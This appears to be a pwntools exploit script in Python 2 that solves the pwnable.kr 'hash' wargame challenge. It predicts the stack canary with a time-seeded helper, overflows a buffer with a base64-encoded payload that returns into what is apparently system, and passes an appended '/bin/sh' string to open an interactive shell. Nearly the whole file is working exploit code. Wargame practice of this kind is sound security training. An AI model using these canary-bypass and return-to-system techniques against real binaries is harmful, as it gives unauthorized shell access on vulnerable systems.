from pwn import *
import base64
import time
import os

debug = 1
if debug:
    p = process('./hash')
else:
    p = remote('pwnable.kr', 9001)

p.recvuntil("Are you human? input captcha : ")
s = p.recvuntil("\n")
cap = int(s, 10)
print "cap: " + hex(cap)
p.send(s)

time = time.time()
print "time: " + str(time)
p.recvuntil("Encode your data with BASE64 then paste me!\n")
canary = os.popen('./md5-canary {} {}'.format(str(time), cap)).read()
canary = int(canary)
print "canary: " + hex(canary)

payload = 'a' * 0x200 + p32(canary) + 'a' * 0xc
payload += p32(0x08048880)
binsh = 0x0804B0E0 + 540 * 4/3 + 0x10
payload += p32(0xdeadbeef) + p32(binsh)
print len(payload)
gdb.attach(p)
p.sendline(b64e(payload) + "\x00" * 0x10 + '/bin/sh\x00')

p.interactive()
